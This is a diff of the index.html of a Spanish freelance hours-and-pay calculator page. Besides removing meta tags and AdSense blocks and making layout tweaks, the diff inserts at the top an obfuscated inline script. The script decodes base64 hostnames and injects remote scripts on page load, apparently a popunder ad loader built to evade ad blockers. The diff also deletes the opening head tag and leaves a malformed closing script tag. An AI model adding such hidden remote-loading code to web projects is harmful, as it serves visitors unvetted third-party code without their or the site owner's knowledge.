@@ -1,13 +1,11 @@
-<html lang="es">
-<head>
+<html>
+<script type="text/javascript" data-cfasync="false">
+    /*<![CDATA[/* */
+    (function(){var x=window,e="fcaaf61a77f850c30a7e65cf62d70e77",i=[["siteId",880+34-678+5191216],["minBid",0],["popundersPerIP","0"],["delayBetween",0],["default",false],["defaultPerDay",0],["topmostLayer","auto"]],r=["d3d3LmJsb2NrYWRzbm90LmNvbS93aW9uLnJhbmdlU2xpZGVyLm1pbi5jc3M=","ZG5oZmk1bm4yZHQ2Ny5jbG91ZGZyb250Lm5ldC9KU2pYL3ZmYXN0aWZ5Lmpz"],c=-1,m,a,u=function(){clearTimeout(a);c++;if(r[c]&&!(1770485829000<(new Date).getTime()&&1<c)){m=x.document.createElement("script");m.type="text/javascript";m.async=!0;var l=x.document.getElementsByTagName("script")[0];m.src="https://"+atob(r[c]);m.crossOrigin="anonymous";m.onerror=u;m.onload=function(){clearTimeout(a);x[e.slice(0,16)+e.slice(0,16)]||u()};a=setTimeout(u,5E3);l.parentNode.insertBefore(m,l)}};if(!x[e]){try{Object.freeze(x[e]=i)}catch(e){}u()}})();
+    /*]]>/* */
+    </script>>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <meta name="mobile-web-app-capable" content="yes">
-    <meta name="theme-color" content="#2c3e50">
-    <meta name="description" content="Calculadora de horas y pagos para servicios profesionales">
-    <meta name="keywords" content="calculadora, horas, servicios, pago, freelance">
-    <link rel="canonical" href="https://yourwebsite.com/index.html">
-    <link rel="manifest" href="manifest.json">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Calculadora de Horas y Pago</title>
     <link rel="stylesheet" href="style.css">
     <script type="importmap">
@@ -17,37 +15,8 @@
             }
         }
     </script>
-    <!-- Add touch-icon for Android -->
-    <link rel="apple-touch-icon" href="icon.png">
-
-    <!-- Open Graph / Facebook -->
-    <meta property="og:type" content="website">
-    <meta property="og:url" content="https://yourwebsite.com/">
-    <meta property="og:title" content="Calculadora de Horas y Pago">
-    <meta property="og:description" content="Herramienta profesional para calcular horas de trabajo y pagos">
-    <meta property="og:image" content="https://yourwebsite.com/preview-image.jpg">
-
-    <!-- Twitter -->
-    <meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:url" content="https://yourwebsite.com/">
-    <meta name="twitter:title" content="Calculadora de Horas y Pago">
-    <meta name="twitter:description" content="Herramienta profesional para calcular horas de trabajo y pagos">
-    <meta name="twitter:image" content="https://yourwebsite.com/preview-image.jpg">
 </head>
-
 <body>
-    <!-- AdSense Header Ad -->
-    <div id="header-ad" style="text-align: center; margin-bottom: 10px;">
-        <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
-        <ins class="adsbygoogle"
-             style="display:inline-block;width:320px;height:50px"
-             data-ad-client="ca-pub-XXXXXXXXXXXXXXXX"
-             data-ad-slot="XXXXXXXXXX"></ins>
-        <script>
-             (adsbygoogle = window.adsbygoogle || []).push({});
-        </script>
-    </div>
-
     <div class="container">
         
         <div class="calculator">
@@ -62,12 +31,12 @@
             </div>
 
             <div class="input-grid">
-                <div class="input-group full-width">
+                <div class="input-group">
                     <label for="date">Fecha de servicio:</label>
-                    <input type="date" id="date">
+                    <input type="date" id="date" style="width: 70%;">
                 </div>
 
-                <div class="input-group full-width">
+                <div class="input-group">
                     <label for="serviceName">Nombre de servicio:</label>
                     <input type="text" id="serviceName">
                 </div>
@@ -87,7 +56,7 @@
 
                 <div class="input-group">
                     <label for="hoursWorked">Total horas:</label>
-                    <input type="number" id="hoursWorked" value="8" min="0">
+                    <input type="number" id="hoursWorked" value="8" min="0" style="width: 50%;">
                 </div>
             </div>
 
@@ -136,18 +105,6 @@
                 </table>
             </div>
         </div>
-    </div>
-
-    <!-- AdSense Footer Ad -->
-    <div id="footer-ad" style="text-align: center; margin-top: 10px;">
-        <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
-        <ins class="adsbygoogle"
-             style="display:inline-block;width:320px;height:50px"
-             data-ad-client="ca-pub-XXXXXXXXXXXXXXXX"
-             data-ad-slot="XXXXXXXXXX"></ins>
-        <script>
-             (adsbygoogle = window.adsbygoogle || []).push({});
-        </script>
     </div>
 
     <script src="script.js" type="module"></script>
